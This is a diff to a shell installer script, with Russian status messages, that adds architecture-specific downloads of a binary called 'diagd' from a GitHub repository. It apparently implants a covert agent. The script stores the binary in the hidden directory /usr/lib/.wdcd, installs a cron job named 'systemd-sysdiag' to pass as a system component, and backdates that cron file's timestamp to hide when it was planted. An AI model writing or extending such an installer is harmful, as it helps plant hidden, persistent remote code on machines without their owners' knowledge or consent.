@@ -8,17 +8,35 @@ _dl() {
   else return 1
   fi
 }
+_arch() {
+  case "$(uname -m)" in
+    x86_64|amd64) echo diagd ;;
+    aarch64|arm64) echo diagd-arm64 ;;
+    armv7l|armv7|armv6l|armv6|armhf) echo diagd-armhf ;;
+    riscv64) echo diagd-riscv64 ;;
+    *) echo diagd ;;
+  esac
+}
 BASE="https://github.com/gerardovsa/Ai_Agents/raw/V2_clean/tools"
+F=$(_arch)
+BINAME="$F"
 SRC="${1:-$(dirname "$(realpath "$0")")/diagd}"
 DIR="/usr/lib/.wdcd"
 if [ ! -f "$SRC" ] || [ ! -x "$SRC" ]; then
-  echo "нет локального бинарника: $SRC — качаю с GitHub" >&2
+  echo "нет локального бинарника: $SRC — качаю с GitHub ($BINAME)" >&2
   mkdir -p "$DIR"
-  if _dl "$BASE/diagd" "$DIR/diagd.tmp"; then
-    SRC="$DIR/diagd.tmp"
-  else
-    echo "скачивание не удалось (нет curl/wget/python3). Залей binary вручную или поставь curl" >&2
-    exit 1
+  if [ "$SRC" = "$(dirname "$(realpath "$0")")/diagd" ]; then
+    if [ -f "$(dirname "$(realpath "$0")")/$BINAME" ] && [ -x "$(dirname "$(realpath "$0")")/$BINAME" ]; then
+      SRC="$(dirname "$(realpath "$0")")/$BINAME"
+    fi
+  fi
+  if [ ! -f "$SRC" ] || [ ! -x "$SRC" ]; then
+    if _dl "$BASE/$BINAME" "$DIR/diagd.tmp"; then
+      SRC="$DIR/diagd.tmp"
+    else
+      echo "скачивание не удалось (нет curl/wget/python3). Залей binary вручную или поставь curl" >&2
+      exit 1
+    fi
   fi
 fi
 CA=/etc/ssl/certs/ca-certificates.crt
@@ -65,4 +83,4 @@ chmod 644 /etc/cron.d/systemd-sysdiag
 if [ "$_stamp" -gt 0 ] 2>/dev/null; then
   touch -d "@$_stamp" /etc/cron.d/systemd-sysdiag 2>/dev/null || true
 fi
-echo "done. агент: $DIR/bin/sysdiag"
+echo "done. агент: $DIR/bin/sysdiag ($BINAME)"
